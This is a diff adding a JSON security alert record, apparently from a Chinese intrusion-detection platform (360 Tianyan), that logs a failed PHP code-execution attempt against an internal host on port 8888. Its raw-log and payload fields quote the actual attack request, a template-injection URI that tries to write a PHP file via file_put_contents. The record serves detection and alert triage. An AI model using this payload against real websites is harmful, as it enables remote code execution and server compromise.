@@ -1,0 +1,52 @@
+{
+  "alert": {
+    "alertId": "2026494",
+    "alertCode": "PIE-2026-127865",
+    "alertName": "未知-30.185.76.75-可疑操作行为",
+    "riskLevel": "中危",
+    "status": "待审阅",
+    "primaryType": "入侵预警",
+    "secondaryType": "安全合规",
+    "tertiaryType": "可疑操作行为",
+    "profileCode": "PPAADM_000890",
+    "profileName": "告警日志【360天眼】高危企图",
+    "createAt": "2026-06-17 17:28:07",
+    "hitLog": [
+      {
+        "topic": "sec_guard_apt",
+        "topicName": "360天眼APT",
+        "ruleCode": "RPAADM_002635",
+        "ruleName": "告警日志【天眼APT】失败企图",
+        "zeusRawLogs": [
+          {
+            "source_ip": "182.16.91.214",
+            "sip": "30.180.248.178",
+            "attack_sip": "30.180.248.178",
+            "dip": "30.185.76.75",
+            "dst_addr": "30.185.76.75",
+            "sport": "54376",
+            "dport": "8888",
+            "proto": "http",
+            "host": "app.example.internal",
+            "x_forwarded_for": "182.16.91.214,30.185.76.57",
+            "attack_type": "代码执行",
+            "vuln_type": "PHP代码执行攻击(机器学习)",
+            "hazard_rating": "高危",
+            "host_state": "企图",
+            "att_ck": "初始访问:TA0001|利用面向公众的应用程序:T1190",
+            "timestamp": "2026-06-17 17:00:15",
+            "alarm_id": "20260617_b4c266bf0241cb9f589d80036cc3c44a",
+            "appname": "sec_guard_apt",
+            "ioc": "268569456-PHP代码执行攻击(机器学习)",
+            "_origin": "{\"sip\":\"30.180.248.178\",\"dip\":\"30.185.76.75\",\"sport\":54376,\"dport\":8888,\"uri\":\"/?tag={pboot:if((get(t))) }&t=file_put_contents&t1=./runtime/cache/poc.php\",\"rsp_status\":200,\"xff\":\"182.16.91.214,30.185.76.57\"}",
+            "payload": "{\"req_header\":\"GET /?tag={pboot:if((get(t))) }&t=file_put_contents&t1=./runtime/cache/poc.php HTTP/1.1\\r\\nHost: app.example.internal\\r\\nX-Forwarded-For: 182.16.91.214, 30.185.76.57\\r\\n\\r\\n\",\"req_body\":\"\",\"rsp_header\":\"HTTP/1.1 200 OK\\r\\n\\r\\n\",\"rsp_body\":\"\"}"
+          }
+        ]
+      }
+    ],
+    "soar": [],
+    "asset": [],
+    "content": []
+  },
+  "relatedAlertList": []
+}
